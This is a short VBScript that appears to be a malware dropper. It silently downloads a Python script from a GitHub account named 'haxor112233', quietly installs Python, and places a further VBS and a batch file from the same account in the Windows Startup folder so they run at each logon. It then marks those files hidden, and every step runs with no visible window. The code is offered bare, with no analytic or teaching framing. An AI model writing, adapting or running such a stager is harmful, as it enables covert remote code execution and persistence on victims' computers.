Set objShell = CreateObject("WScript.Shell")

' Get Startup folder path
startupFolder = objShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\"


' Run the first curl command to download a.py
objShell.Run "cmd /c curl -s -o ""%TEMP%\a.py"" ""https://raw.githubusercontent.com/haxor112233/file/refs/heads/main/a.py""", 0, True

' Run the second curl command to download the Python installer
objShell.Run "cmd /c curl -s -o ""%TEMP%\python-3.13.1-amd64.exe"" ""https://www.python.org/ftp/python/3.13.1/python-3.13.1-amd64.exe""", 0, True

' Run the Python installer with silent options
objShell.Run """%TEMP%\python-3.13.1-amd64.exe"" /quiet InstallAllUsers=0 PrependPath=1 Include_pip=1", 0, True



' Define file paths
fileVBS = startupFolder & "file.vbs"
fileBAT = startupFolder & "file2.bat"

' Download file.vbs to Startup folder
objShell.Run "cmd /c curl -s -o """ & fileVBS & """ ""https://raw.githubusercontent.com/haxor112233/file/refs/heads/main/file.vbs""", 0, True

' Download file2.bat to Startup folder
objShell.Run "cmd /c curl -s -o """ & fileBAT & """ ""https://raw.githubusercontent.com/haxor112233/file/refs/heads/main/file2.bat""", 0, True

' Set files to hidden
objFSO.GetFile(fileVBS).Attributes = 2  ' 2 = Hidden
objFSO.GetFile(fileBAT).Attributes = 2  ' 2 = Hidden
